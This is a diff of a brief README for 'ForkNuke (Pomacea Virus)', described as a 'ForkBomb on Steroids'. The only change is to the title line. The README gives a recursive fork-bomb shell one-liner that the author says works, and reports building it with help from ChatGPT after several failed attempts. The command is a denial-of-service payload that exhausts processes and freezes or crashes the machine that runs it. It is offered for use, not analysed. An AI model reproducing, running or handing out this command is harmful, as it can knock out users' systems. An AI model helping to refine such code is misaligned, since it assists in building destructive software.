@@ -1,4 +1,4 @@
-# ForkNuke
+# ForkNuke (Pomacea Virus)
 ChatGPT describes as the "ForkBomb on Steroids"
 Creating a recusive forkbomb. After some trial and error, and many syntax errors from mine and ChatGPTs generations, here is the final:
 ME: _(){ _ | _ & }; :(){ $1 | : _ &}; : _ worked for me
